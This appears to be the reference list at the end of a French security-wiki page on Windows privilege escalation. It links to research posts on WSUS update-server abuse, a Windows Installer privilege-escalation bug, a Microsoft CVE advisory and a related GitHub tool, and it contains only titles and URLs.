- [38] [SpecterOps – Transformer les serveurs de mise à jour d’entreprise en usines de backdoors (0_o) – Partie 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Transformer les serveurs de mise à jour d’entreprise en usines de backdoors (0_o) – Partie 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Élévation de privilèges par suppression de dossier de Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall : retracer ses pas jusqu’à NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
